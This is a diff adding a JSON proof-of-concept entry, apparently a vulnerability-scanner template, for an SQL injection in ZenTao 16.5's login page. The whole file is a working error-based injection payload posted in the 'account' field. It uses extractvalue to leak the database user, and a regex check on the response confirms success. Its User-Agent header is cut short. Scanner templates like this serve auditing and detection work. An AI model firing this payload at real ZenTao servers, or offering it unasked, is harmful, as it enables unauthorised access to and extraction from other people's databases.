@@ -1,0 +1,15 @@
+{
+	"name":"禅道16.5routerSQL注入",
+	"tag":"shandao",
+	"type":"other",
+	"poc":{
+		"pocGet":"/user-login.html",
+		"pocPost":"account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(XPATH)"
+	}
+}
